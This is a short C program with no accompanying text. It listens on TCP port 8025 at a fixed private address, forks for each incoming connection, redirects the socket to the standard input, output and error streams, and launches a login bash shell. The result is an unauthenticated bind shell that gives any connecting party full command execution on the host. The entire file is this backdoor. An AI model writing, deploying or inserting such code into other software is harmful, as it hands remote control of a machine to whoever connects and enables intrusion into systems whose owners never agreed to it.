#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

void checkError(int status)
{
        if(status<0)
        {
                printf("socket error: [%s]\n", strerror(errno));
                exit(-1);
        }
}

int main(int argc , char *argv[]) {
        int sid = socket(AF_INET,SOCK_STREAM,0);
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(8025);
        addr.sin_addr.s_addr = inet_addr("192.168.43.14");
        int status = bind(sid,(struct sockaddr*)&addr,sizeof(addr));
        checkError(status);
        status = listen(sid,10);
        checkError(status);

        while(1) {
                struct sockaddr_in client;
                socklen_t clientSize;
		int c = sizeof(struct sockaddr_in);
                int chatSocket = accept(sid, (struct sockaddr*)&client, (socklen_t*)&c);
                checkError(chatSocket);
                printf("Get socket: %d\n",chatSocket);
                pid_t value = fork();
                if(value<0)
                {
                        printf("Fork failed");
                        exit(-1);
                } else if(value==0) {

                        dup2(chatSocket, 0);
                        dup2(chatSocket, 1);
                        dup2(chatSocket, 2);
                        close(chatSocket);
                        execlp("bash", "bash", "-l", NULL);
                } else{
                        close(chatSocket);
                }
        }
        return 0;
}
